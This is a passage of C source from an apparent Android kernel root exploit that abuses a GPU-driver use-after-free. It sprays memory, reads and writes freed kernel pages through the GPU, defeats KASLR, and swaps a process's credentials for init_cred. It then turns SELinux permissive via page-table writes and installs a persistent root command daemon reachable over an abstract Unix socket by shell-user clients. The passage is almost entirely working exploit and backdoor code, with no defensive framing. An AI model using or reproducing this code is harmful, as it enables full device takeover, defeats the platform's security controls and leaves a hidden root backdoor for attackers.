    const unsigned char *buffer = data;
    size_t offset = 0;
    while (offset < length) {
        ssize_t sent = write(fd, buffer + offset, length - offset);
        if (sent > 0) {
            offset += (size_t)sent;
            continue;
        }
        if (sent < 0 && errno == EINTR)
            continue;
        return -1;
    }
    return 0;
}

static void run_shell_broker(struct shared_state *shared) {
    int listener = root_listener;
    signal(SIGPIPE, SIG_IGN);
    setsid();
    prctl(PR_SET_NAME, "coral_broker", 0, 0, 0);
    close(root_output_pipe[1]);
    for (int fd = 3; fd < 256; ++fd) {
        if (fd != listener && fd != root_output_pipe[0] && fd != root_null_fd)
            close(fd);
    }
    if (root_null_fd >= 0) {
        dup2(root_null_fd, STDIN_FILENO);
        dup2(root_null_fd, STDOUT_FILENO);
        dup2(root_null_fd, STDERR_FILENO);
    }
    fcntl(root_output_pipe[0], F_SETFL, fcntl(root_output_pipe[0], F_GETFL) | O_NONBLOCK);
    __atomic_store_n(&shared->daemon_stage, 1, __ATOMIC_RELEASE);
    for (;;) {
        size_t used = 0;
        int command_complete = 0;
        int client_dead = 0;
        int client = accept(listener, NULL, NULL);
        if (client < 0) {
            if (errno == EINTR)
                continue;
            usleep(10000);
            continue;
        }
        struct ucred peer;
        socklen_t peer_length = sizeof(peer);
        if (getsockopt(client, SOL_SOCKET, SO_PEERCRED, &peer, &peer_length) != 0 ||
            peer_length != sizeof(peer) || (peer.uid != 0 && peer.uid != 2000)) {
            close(client);
            continue;
        }
        struct timeval receive_timeout = {.tv_sec = 5, .tv_usec = 0};
        if (setsockopt(client, SOL_SOCKET, SO_RCVTIMEO,
                       &receive_timeout, sizeof(receive_timeout)) != 0) {
            close(client);
            continue;
        }
        while (used + 1 < sizeof(shared->command)) {
            ssize_t got = read(client, shared->command + used, 1);
            if (got > 0) {
                ++used;
                if (shared->command[used - 1] == '\0') {
                    command_complete = 1;
                    break;
                }
                continue;
            }
            if (got < 0 && errno == EINTR)
                continue;
            break;
        }
        if (!command_complete || used <= 1) {
            close(client);
            continue;
        }
        shared->command_done = 0;
        unsigned int seq = __atomic_add_fetch(&shared->command_seq, 1, __ATOMIC_RELEASE);
        for (;;) {
            int done = __atomic_load_n(&shared->command_done, __ATOMIC_ACQUIRE) == seq;
            char buffer[4096];
            ssize_t got = read(root_output_pipe[0], buffer, sizeof(buffer));
            if (got > 0) {
                if (!client_dead && write_client_all(client, buffer, (size_t)got) != 0)
                    client_dead = 1;
                continue;
            }
            if (got == 0)
                break;
            if (errno == EINTR)
                continue;
            if (errno == EAGAIN || errno == EWOULDBLOCK) {
                if (done)
                    break;
                usleep(1000);
                continue;
            }
            break;
        }
        unsigned char result = 1;
        if (shared->command_done == seq) {
            if (WIFEXITED(shared->child_status))
                result = (unsigned char)WEXITSTATUS(shared->child_status);
            else if (WIFSIGNALED(shared->child_status))
                result = (unsigned char)(128 + WTERMSIG(shared->child_status));
        }
        if (!client_dead)
            write_client_all(client, &result, 1);
        close(client);
    }
}

static void run_root_daemon(struct shared_state *shared) {
    setsid();
    prctl(PR_SET_NAME, "coral_rootd", 0, 0, 0);
    close(root_output_pipe[0]);
    for (int fd = 3; fd < 256; ++fd) {
        if (fd != root_output_pipe[1] && fd != root_null_fd)
            close(fd);
    }
    if (root_null_fd >= 0) {
        dup2(root_null_fd, STDIN_FILENO);
        dup2(root_null_fd, STDOUT_FILENO);
        dup2(root_null_fd, STDERR_FILENO);
    }
    unsigned int handled = 0;
    for (;;) {
        unsigned int seq = __atomic_load_n(&shared->command_seq, __ATOMIC_ACQUIRE);
        if (seq == handled) {
            usleep(1000);
            continue;
        }
        char command[4096];
        memcpy(command, shared->command, sizeof(command));
        command[sizeof(command) - 1] = '\0';
        handled = seq;
        shared->exec_stage = 0;
        shared->exec_errno = 0;
        shared->child_status = 0;
        __atomic_store_n(&shared->command_ack, seq, __ATOMIC_RELEASE);
        pid_t pid = fork();
        if (pid == 0) {
            shared->exec_stage = 1;
            setgroups(0, NULL);
            setresgid(0, 0, 0);
            setresuid(0, 0, 0);
            shared->exec_stage = 2;
            dup2(root_null_fd, STDIN_FILENO);
            dup2(root_output_pipe[1], STDOUT_FILENO);
            dup2(root_output_pipe[1], STDERR_FILENO);
            shared->exec_stage = 3;
            execl("/system/bin/sh", "sh", "-c", command, NULL);
            shared->exec_errno = errno;
            shared->exec_stage = 4;
            dprintf(root_output_pipe[1], "exec failed uid=%d errno=%d\n", getuid(), errno);
            _exit(127);
        }
        if (pid > 0) {
            int status = 0;
            while (waitpid(pid, &status, 0) < 0 && errno == EINTR)
                ;
            shared->child_status = status;
        } else {
            shared->exec_errno = errno;
        }
        __atomic_store_n(&shared->command_done, seq, __ATOMIC_RELEASE);
    }
}

static void selected_child(struct shared_state *shared, int index) {
    (void)index;
    if (pipe2(root_output_pipe, O_CLOEXEC) != 0) {
        shared->root_result = -1;
        shared->daemon_errno = errno;
        __atomic_store_n(&shared->stage, 3, __ATOMIC_RELEASE);
        return;
    }
    pid_t broker = fork();
    if (broker == 0) {
        run_shell_broker(shared);
        _exit(0);
    }
    if (broker < 0) {
        shared->root_result = -1;
        shared->daemon_errno = errno;
        __atomic_store_n(&shared->stage, 3, __ATOMIC_RELEASE);
        return;
    }
    shared->broker_pid = broker;
    shared->child_step = 1;
    __atomic_store_n(&shared->stage, 1, __ATOMIC_RELEASE);
    for (unsigned int i = 0; i < 1000; ++i) {
        if (__atomic_load_n(&shared->stage, __ATOMIC_ACQUIRE) == 2)
            break;
        usleep(10000);
    }
    shared->observed_uid = getuid();
    shared->root_result = getuid() == 0 ? 0 : -1;
    if (shared->root_result != 0)
        snprintf(shared->error, sizeof(shared->error), "init_cred did not produce uid zero");
    __atomic_store_n(&shared->stage, 3, __ATOMIC_RELEASE);
    for (unsigned int i = 0; i < 1000; ++i) {
        if (__atomic_load_n(&shared->stage, __ATOMIC_ACQUIRE) == 4)
            break;
        usleep(10000);
    }
    if (shared->root_result == 0 && shared->stage == 4)
        run_root_daemon(shared);
}

static int client_connect(void) {
    struct sockaddr_un address = {0};
    int fd = -1;
    address.sun_family = AF_UNIX;
    address.sun_path[0] = '\0';
    snprintf(address.sun_path + 1, sizeof(address.sun_path) - 1, "%s", ROOT_SOCKET);
    socklen_t length = (socklen_t)(offsetof(struct sockaddr_un, sun_path) + 1 + strlen(ROOT_SOCKET));
    for (unsigned int i = 0; i < 100; ++i) {
        fd = socket(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0);
        if (fd < 0)
            return -1;
        if (connect(fd, (struct sockaddr *)&address, length) == 0)
            return fd;
        close(fd);
        usleep(100000);
    }
    return -1;
}

static int hex_nibble(char c) {
    if (c >= '0' && c <= '9')
        return c - '0';
    if (c >= 'a' && c <= 'f')
        return c - 'a' + 10;
    if (c >= 'A' && c <= 'F')
        return c - 'A' + 10;
    return -1;
}

static int run_client(int argc, char **argv) {
    char command[4096] = {0};
    size_t used = 0;
    int start = 1;
    int fd;
    if (argc == 1) {
        snprintf(command, sizeof(command), "id");
    } else if (argc == 3 && strcmp(argv[1], "--hex") == 0) {
        size_t length = strlen(argv[2]);
        if (length == 0 || (length & 1) != 0 || length / 2 >= sizeof(command))
            return 2;
        for (size_t i = 0; i < length / 2; ++i) {
            int high = hex_nibble(argv[2][i * 2]);
            int low = hex_nibble(argv[2][i * 2 + 1]);
            if (high < 0 || low < 0)
                return 2;
            command[i] = (char)((high << 4) | low);
        }
        command[length / 2] = '\0';
    } else {
        if (argc > 2 && strcmp(argv[1], "-c") == 0)
            start = 2;
        for (int i = start; i < argc; ++i) {
            int written = snprintf(command + used, sizeof(command) - used, "%s%s",
                                   used == 0 ? "" : " ", argv[i]);
            if (written < 0 || (size_t)written >= sizeof(command) - used)
                return 1;
            used += (size_t)written;
        }
    }
    fd = client_connect();
    if (fd < 0) {
        fprintf(stderr, "coral root daemon unavailable: %s\n", strerror(errno));
        return 1;
    }
    signal(SIGPIPE, SIG_IGN);
    if (write(fd, command, strlen(command) + 1) != (ssize_t)(strlen(command) + 1)) {
        close(fd);
        return 1;
    }
    unsigned char buffer[4096];
    unsigned char pending = 1;
    int have_pending = 0;
    ssize_t got;
    shutdown(fd, SHUT_WR);
    while ((got = read(fd, buffer, sizeof(buffer))) > 0) {
        if (have_pending && write(STDOUT_FILENO, &pending, 1) != 1) {
            close(fd);
            return 1;
        }
        ssize_t offset = 0;
        while (offset < got - 1) {
            ssize_t sent = write(STDOUT_FILENO, buffer + offset, (size_t)(got - 1 - offset));
            if (sent <= 0) {
                close(fd);
                return 1;
            }
            offset += sent;
        }
        pending = buffer[got - 1];
        have_pending = 1;
    }
    close(fd);
    return got < 0 || !have_pending ? 1 : pending;
}

static int find_slot(struct shared_state *shared, unsigned int count, pid_t pid) {
    for (unsigned int i = 0; i < count; ++i) {
        if (shared->slots[i].pid == pid)
            return (int)i;
    }
    return -1;
}

static int run_exploit(int fd, struct resources *res, unsigned int delay_us,
                       struct shared_state *shared) {
    struct gpu_state gpu;
    unsigned char *page = NULL;
    uint64_t found_va = 0;
    uint64_t storage_gpu_va = 0;
    uint64_t storage_kernel_base = 0;
    uint32_t shell_sid = 0;
    unsigned int task_candidates = 0;
    uint64_t value = 0;
    pid_t selected_pid = 0;
    unsigned int created = 0;
    int rc = 1;
    (void)res;
    (void)delay_us;
    memset(shared, 0, sizeof(*shared));
    shared->selected_index = -1;
    printf("MEMORY_PRESSURE_START mb=%u\n", 768);
    if (apply_memory_pressure(768ULL * 1024 * 1024) != 0)
        fprintf(stderr, "memory pressure failed: %s\n", strerror(errno));
    printf("MEMORY_PRESSURE_DONE\n");
    printf("UAF_FREED spraying_tasks=%u\n", SPRAY_INITIAL);
    created = (unsigned int)spray_tasks(shared, SPRAY_INITIAL);
    printf("tasks_created=%u\n", created);
    if (created < 100)
        goto out;
    if (gpu_setup(&gpu, fd) != 0) {
        fprintf(stderr, "GPU setup failed: %s\n", strerror(errno));
        goto out;
    }
    if (gpu_write64(&gpu, gpu.dst_gpu, 0x1122334455667788ULL) != 0) {
        fprintf(stderr, "GPU write self-test submission failed\n");
        goto out_gpu;
    }
    msync(gpu.dst_mapping, PAGE_SIZE, MS_SYNC | MS_INVALIDATE);
    memcpy(&value, gpu.dst_mapping, sizeof(value));
    if (value != 0x1122334455667788ULL) {
        fprintf(stderr, "GPU write self-test mismatch: 0x%llx\n", (unsigned long long)value);
        goto out_gpu;
    }
    printf("GPU_WRITE_SELFTEST_PASS\n");
    printf("MMAP_SPRAY_START\n");
    if (create_mmap_spray() != 0)
        fprintf(stderr, "mmap spray stopped early at %u\n", mmap_spray_done);
    printf("MMAP_SPRAY_DONE count=%u\n", mmap_spray_done);
    page = malloc(PAGE_SIZE);
    if (page == NULL)
        goto out_gpu;
    printf("SCAN_START pages=%llu\n", (unsigned long long)(UAF_SIZE / PAGE_SIZE));
    pt_candidate_count = 0;
    unsigned int nonzero_pages = 0;
    for (unsigned int storage_round = 0; storage_round < 1 && storage_gpu_va == 0; ++storage_round) {
        if (storage_round != 0) {
            shared->eventfd_ready = 0;
            if (start_socket_holder(shared, 16384) < 0)
                goto out_gpu;
            for (unsigned int i = 0; i < 1000; ++i) {
                if (__atomic_load_n(&shared->eventfd_ready, __ATOMIC_ACQUIRE) != 0)
                    break;
                usleep(10000);
            }
            printf("SOCKET_HOLDER round=%u ready=%d\n", storage_round, shared->eventfd_ready);
        }
        nonzero_pages = 0;
    for (uint64_t va = UAF_START; va < UAF_START + UAF_SIZE; va += PAGE_SIZE) {
        uint64_t address_limit;
        unsigned int nonzero_dwords = 0;
        unsigned int page_index = (unsigned int)((va - UAF_START) / PAGE_SIZE);
        if (gpu_read_page(&gpu, va, page) != 0) {
            fprintf(stderr, "GPU page read failed at 0x%llx: %s\n",
                    (unsigned long long)va, strerror(errno));
            goto out_gpu;
        }
        memcpy(&address_limit, page + ADDR_LIMIT_OFFSET, sizeof(address_limit));
        for (unsigned int i = 0; i < 1024; ++i) {
            if (((uint32_t *)page)[i] != 0)
                ++nonzero_dwords;
        }
        if (nonzero_dwords != 0)
            ++nonzero_pages;
        if (pt_candidate_count < MAX_PT_CANDIDATES && nonzero_dwords == 10) {
            uint32_t *data = (uint32_t *)page;
            if (data[2] && data[3] && data[6] && data[7] && data[10] &&
                data[11] && data[14] && data[15] && data[18] && data[19] &&
                (data[2] & 3) == 3 && (data[6] & 3) == 3) {
                uint64_t *pte = (uint64_t *)page;
                pt_candidates[pt_candidate_count].gpu_va = va;
                pt_candidates[pt_candidate_count].original = pte[1];
                pt_candidates[pt_candidate_count].alias = pte[3];
                if (pt_candidate_count < 3)
                    printf("PT_CANDIDATE=%u gpu_va=0x%llx flags=0x%x,0x%x\n", pt_candidate_count,
                           (unsigned long long)va, data[2] & 0xfff, data[6] & 0xfff);
                ++pt_candidate_count;
            }
        }
        if (page_index % 1000 == 0)
            printf("scan_page=%u nonzero_pages=%u\n", page_index, nonzero_pages);
        if (storage_gpu_va == 0) {
            for (unsigned int off = 0; off + 0xa0 <= PAGE_SIZE; off += 8) {
                uint64_t prot;
                uint64_t next;
                uint64_t prev;
                uint64_t object;
                uint64_t socket_slide;
                memcpy(&prot, page + off + 0x28, sizeof(prot));
                if (prot < UDP_PROT_NOKASLR ||
                    (prot & 0x1fffffULL) != (UDP_PROT_NOKASLR & 0x1fffffULL))
                    continue;
                socket_slide = prot - UDP_PROT_NOKASLR;
                if ((socket_slide & 0x1fffffULL) != 0)
                    continue;
                memcpy(&next, page + off + 0x98, sizeof(next));
                memcpy(&prev, page + off + 0xa0, sizeof(prev));
                object = next - 0x98;
                if (next == prev && (object >> 48) == 0xffff &&
                    (object & 0xfffULL) == off) {
                    storage_kernel_base = object - off;
                    storage_gpu_va = va;
                    printf("UDP_STORAGE gpu_va=0x%llx kernel_page=0x%llx object=0x%llx off=0x%x\n",
                           (unsigned long long)va, (unsigned long long)storage_kernel_base,
                           (unsigned long long)object, off);
                    break;
                }
            }
        }
        if (found_va != 0 && pt_candidate_count > 0)
            break;
        if (found_va != 0)
            continue;
        if (address_limit != USER_DS || memcmp(page + COMM_OFFSET, "CORAL", 5) != 0)
            continue;
        char comm[16] = {0};
        memcpy(comm, page + COMM_OFFSET, sizeof(comm));
        pid_t pid = (pid_t)atoi(comm + 5);
        int slot = find_slot(shared, created, pid);
        if (slot < 0 || kill(pid, 0) != 0)
            continue;
        uint64_t list;
        uint64_t sched_class;
        uint64_t cred;
        uint64_t slide;
        uint64_t thread_self;
        uint64_t child_self;
        uint64_t own_task;
        memcpy(&list, page + TASKS_OFFSET, sizeof(list));
        memcpy(&sched_class, page + SCHED_CLASS_OFFSET, sizeof(sched_class));
        memcpy(&cred, page + CRED_OFFSET, sizeof(cred));
        memcpy(&thread_self, page + THREAD_GROUP_OFFSET, sizeof(thread_self));
        memcpy(&child_self, page + CHILDREN_OFFSET, sizeof(child_self));
        own_task = child_self - CHILDREN_OFFSET;
        if ((own_task >> 48) != 0xffff || (own_task & 0xfffULL) != 0)
            own_task = thread_self - THREAD_GROUP_OFFSET;
        if (sched_class < FAIR_SCHED_CLASS_NOKASLR)
            continue;
        slide = sched_class - FAIR_SCHED_CLASS_NOKASLR;
        if (slot < 0 || (list >> 48) != 0xffff || (cred >> 48) != 0xffff ||
            (own_task >> 48) != 0xffff || (own_task & 0xfffULL) != 0 ||
            (slide & 0x1fffffULL) != 0)
            continue;
        found_va = va;
        selected_pid = pid;
        shared->selected_index = slot;
        shared->task_list = list;
        shared->cred = cred;
        shared->own_task = own_task;
        shared->kaslr_slide = slide;
        memcpy(shared->selected_comm, comm, sizeof(comm));
        ++task_candidates;
        if (task_candidates <= 3)
            printf("TASK_FOUND pid=%d gpu_va=0x%llx task=0x%llx child_self=0x%llx thread_self=0x%llx slide=0x%llx\n", pid,
                   (unsigned long long)va, (unsigned long long)own_task,
                   (unsigned long long)child_self, (unsigned long long)thread_self,
                   (unsigned long long)slide);
        if (pt_candidate_count > 0)
            break;
    }
    }
    if (found_va == 0 || pt_candidate_count == 0) {
        fprintf(stderr, "Reclaim incomplete: task=0x%llx pt_candidates=%u nonzero_pages=%u\n",
                (unsigned long long)found_va, pt_candidate_count, nonzero_pages);
        goto out_gpu;
    }
    stop_spray(shared, created, selected_pid);
    created = 0;
    printf("SPRAY_CLEANUP_EARLY\n");
    __atomic_store_n(&shared->slots[shared->selected_index].action, 1, __ATOMIC_RELEASE);
    for (unsigned int i = 0; i < 3000; ++i) {
        if (__atomic_load_n(&shared->stage, __ATOMIC_ACQUIRE) != 0)
            break;
        usleep(10000);
    }
    if (shared->stage != 1) {
        fprintf(stderr, "Broker setup failed or timed out\n");
        goto out_gpu;
    }
    goto use_init_cred;
    {
        uint64_t fake_cred[21] = {0};
        uint64_t fake_tsec[3] = {0};
        uint64_t caps = 0x000000ffffffffffULL;
        uint64_t cred_address = storage_kernel_base + 0x100;
        uint64_t tsec_address = storage_kernel_base + 0x1a0;
        uint64_t real_cred_check = 0;
        uint64_t cred_check = 0;
        fake_cred[0] = 0x100000;
        fake_cred[0x30 / 8] = caps;
        fake_cred[0x38 / 8] = caps;
        fake_cred[0x40 / 8] = caps;
        fake_cred[0x78 / 8] = tsec_address;
        fake_cred[0x80 / 8] = ROOT_USER_NOKASLR + shared->kaslr_slide;
        fake_cred[0x88 / 8] = INIT_USER_NS_NOKASLR + shared->kaslr_slide;
        fake_cred[0x90 / 8] = INIT_GROUPS_NOKASLR + shared->kaslr_slide;
        fake_tsec[0] = shell_sid | ((uint64_t)shell_sid << 32);
        printf("FAKE_CRED_WRITE task=0x%llx cred=0x%llx tsec=0x%llx sid=%u\n",
               (unsigned long long)shared->own_task, (unsigned long long)cred_address,
               (unsigned long long)tsec_address, shell_sid);
        for (unsigned int i = 0; i < 21; ++i) {
            if (gpu_write64(&gpu, storage_gpu_va + 0x100 + i * 8, fake_cred[i]) != 0)
                goto out_gpu;
        }
        for (unsigned int i = 0; i < 3; ++i) {
            if (gpu_write64(&gpu, storage_gpu_va + 0x1a0 + i * 8, fake_tsec[i]) != 0)
                goto out_gpu;
        }
        uint64_t usage_check = 0;
        uint64_t security_check = 0;
        uint64_t sid_check = 0;
        if (gpu_read64(&gpu, storage_gpu_va + 0x100, &usage_check) != 0 ||
            gpu_read64(&gpu, storage_gpu_va + 0x100 + 0x78, &security_check) != 0 ||
            gpu_read64(&gpu, storage_gpu_va + 0x1a0, &sid_check) != 0 ||
            usage_check != 0x100000 || security_check != tsec_address ||
            sid_check != fake_tsec[0]) {
            fprintf(stderr, "fake credential content verification failed\n");
            goto out_gpu;
        }
        if (gpu_write64(&gpu, found_va + REAL_CRED_OFFSET, cred_address) != 0 ||
            gpu_write64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, cred_address) != 0 ||
            gpu_read64(&gpu, found_va + REAL_CRED_OFFSET, &real_cred_check) != 0 ||
            gpu_read64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, &cred_check) != 0 ||
            real_cred_check != cred_address || cred_check != cred_address) {
            fprintf(stderr, "fake credential pointer verification failed\n");
            goto out_gpu;
        }
    }
use_init_cred:
    {
        uint64_t init_cred = INIT_CRED_NOKASLR + shared->kaslr_slide;
        uint64_t real_cred_check = 0;
        uint64_t cred_check = 0;
        if (gpu_write64(&gpu, found_va + REAL_CRED_OFFSET, init_cred) != 0 ||
            gpu_write64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, init_cred) != 0 ||
            gpu_read64(&gpu, found_va + REAL_CRED_OFFSET, &real_cred_check) != 0 ||
            gpu_read64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, &cred_check) != 0 ||
            real_cred_check != init_cred || cred_check != init_cred)
            goto out_gpu;
    }
    printf("INIT_CRED_SWITCH_CONFIRMED\n");
    __atomic_store_n(&shared->stage, 2, __ATOMIC_RELEASE);
    for (unsigned int i = 0; i < 3000; ++i) {
        if (__atomic_load_n(&shared->stage, __ATOMIC_ACQUIRE) >= 3)
            break;
        usleep(10000);
    }
    if (shared->stage < 3) {
        fprintf(stderr, "Root executor confirmation timed out\n");
        goto out_gpu;
    }
    printf("ROOT_STAGE uid_result=%d task=0x%llx init=0x%llx cred=0x%llx slide=0x%llx %s\n",
           shared->root_result, (unsigned long long)shared->own_task,
           (unsigned long long)shared->init_task, (unsigned long long)shared->cred,
           (unsigned long long)shared->kaslr_slide, shared->error);
    if (disable_selinux_via_pagetables(&gpu) != 0) {
        fprintf(stderr, "SELinux physical page-table write failed\n");
        goto out_gpu;
    }
    printf("SELINUX_PERMISSIVE_CONFIRMED\n");
    free_mmap_spray();
    if (shared->root_result != 0) {
        uint64_t init_cred = INIT_CRED_NOKASLR + shared->kaslr_slide;
        uint64_t real_cred_check = 0;
        uint64_t cred_check = 0;
        if (gpu_write64(&gpu, found_va + REAL_CRED_OFFSET, init_cred) != 0 ||
            gpu_write64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, init_cred) != 0 ||
            gpu_read64(&gpu, found_va + REAL_CRED_OFFSET, &real_cred_check) != 0 ||
            gpu_read64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, &cred_check) != 0 ||
            real_cred_check != init_cred || cred_check != init_cred)
            goto out_gpu;
        shared->root_result = 0;
        printf("INIT_CRED_FALLBACK_CONFIRMED\n");
    }
    goto selinux_ready;
    {
        uint64_t privileged_cred[21] = {0};
        uint64_t privileged_tsec[3] = {0};
        uint64_t caps = 0x000000ffffffffffULL;
        uint64_t cred_address = storage_kernel_base + 0x200;
        uint64_t tsec_address = storage_kernel_base + 0x2a0;
        uint64_t real_cred_check = 0;
        uint64_t cred_check = 0;
        privileged_cred[0] = 0x100000;
        privileged_cred[0x30 / 8] = caps;
        privileged_cred[0x38 / 8] = caps;
        privileged_cred[0x40 / 8] = caps;
        privileged_cred[0x78 / 8] = tsec_address;
        privileged_cred[0x80 / 8] = ROOT_USER_NOKASLR + shared->kaslr_slide;
        privileged_cred[0x88 / 8] = INIT_USER_NS_NOKASLR + shared->kaslr_slide;
        privileged_cred[0x90 / 8] = INIT_GROUPS_NOKASLR + shared->kaslr_slide;
        privileged_tsec[0] = 7 | (7ULL << 32);
        for (unsigned int i = 0; i < 21; ++i) {
            if (gpu_write64(&gpu, storage_gpu_va + 0x200 + i * 8, privileged_cred[i]) != 0)
                goto out_gpu;
        }
        for (unsigned int i = 0; i < 3; ++i) {
            if (gpu_write64(&gpu, storage_gpu_va + 0x2a0 + i * 8, privileged_tsec[i]) != 0)
                goto out_gpu;
        }
        for (unsigned int i = 0; i < 1000; ++i) {
            if (__atomic_load_n(&shared->stage, __ATOMIC_ACQUIRE) == 5)
                break;
            usleep(10000);
        }
        if (shared->stage != 5)
            goto out_gpu;
        if (gpu_write64(&gpu, found_va + REAL_CRED_OFFSET, cred_address) != 0 ||
            gpu_write64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, cred_address) != 0 ||
            gpu_read64(&gpu, found_va + REAL_CRED_OFFSET, &real_cred_check) != 0 ||
            gpu_read64(&gpu, found_va + SUBJECTIVE_CRED_OFFSET, &cred_check) != 0 ||
            real_cred_check != cred_address || cred_check != cred_address)
            goto out_gpu;
        __atomic_store_n(&shared->stage, 6, __ATOMIC_RELEASE);
    }
    int permissive = 0;
    for (unsigned int i = 0; i < 1000; ++i) {
        char mode = '1';
        int enforce = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
        if (enforce >= 0) {
            read(enforce, &mode, 1);
            close(enforce);
        }
        if (mode == '0') {
            permissive = 1;
            break;
        }
        usleep(10000);
    }
    if (!permissive) {
        __atomic_store_n(&shared->stage, 8, __ATOMIC_RELEASE);
        fprintf(stderr, "init-domain setenforce exec failed\n");
        goto out_gpu;
    }
    printf("SELINUX_PERMISSIVE_CONFIRMED\n");
    __atomic_store_n(&shared->stage, 7, __ATOMIC_RELEASE);
selinux_ready:
    printf("PRE_CLEANUP_DAEMON_STAGE=%d\n", shared->daemon_stage);
    stop_spray(shared, created, selected_pid);
    created = 0;
    for (unsigned int i = 0; i < 500; ++i) {
        if (__atomic_load_n(&shared->daemon_stage, __ATOMIC_ACQUIRE) != 0)
            break;
        usleep(10000);
    }
    printf("DAEMON_STAGE=%d errno=%d\n", shared->daemon_stage, shared->daemon_errno);
    if (shared->daemon_stage != 1)
        goto out_gpu;
    __atomic_store_n(&shared->stage, 4, __ATOMIC_RELEASE);
    printf("ROOT_OK socket=%s client=%s su -c id\n", ROOT_SOCKET, "/data/local/tmp/coral_root");
    rc = 0;

out_gpu:
    free(page);
    if (mmap_spray_done != 0)
        free_mmap_spray();
    gpu_cleanup(&gpu);
out:
    if (created != 0)
        stop_spray(shared, created, 0);
    if (root_listener >= 0)
        close(root_listener);
    if (root_log_fd >= 0)
        close(root_log_fd);
    if (root_null_fd >= 0)
        close(root_null_fd);
    return rc;
}
